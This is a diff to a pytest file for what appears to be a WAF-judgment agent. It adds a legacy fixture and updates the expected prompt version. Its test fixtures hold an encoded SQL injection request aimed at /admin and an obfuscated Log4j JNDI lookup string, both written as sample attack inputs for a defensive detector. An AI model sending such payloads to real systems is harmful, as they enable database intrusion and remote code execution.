@@ -17,6 +17,10 @@ from test_moduagent_worker import primary_output
 
 pytestmark = pytest.mark.usefixtures("registered_vllm_target")
 
+# Archived v2.20 worker replay; current runtime is covered by test_worker_v221.py.
+pytestmark = [*(pytestmark if isinstance(pytestmark, list) else [pytestmark]),
+              pytest.mark.usefixtures("legacy_v220_admissions")]
+
 
 RAW = "GET /search?q=%27%20OR%201%3D1--&next=%252Fadmin HTTP/1.1\r\nHost: synthetic.test\r\n\r\n"
 JNDI_RAW_EXCERPT = "${${lower:J}ndi:ldap://synthetic.invalid/a}"
@@ -165,7 +169,7 @@ def test_unchanged_jndi_warning_is_a_whole_bounded_model_hint():
 def test_agent_instructions_keep_lookup_candidates_distinct_from_observed_execution():
     from app.agent.prompts import BASE_INSTRUCTIONS, PROMPT_VERSION
 
-    assert PROMPT_VERSION == "waf-judgment-v2.20"
+    assert PROMPT_VERSION == "waf-judgment-v2.21"
     for marker in ["log4j_lookup_static", "unresolved_lookup", "default_lookup_candidate", "base64_padding_inferred"]:
         assert marker in BASE_INSTRUCTIONS
     assert "성공 증거 부재로 시도를 부정하지 않는다" in BASE_INSTRUCTIONS
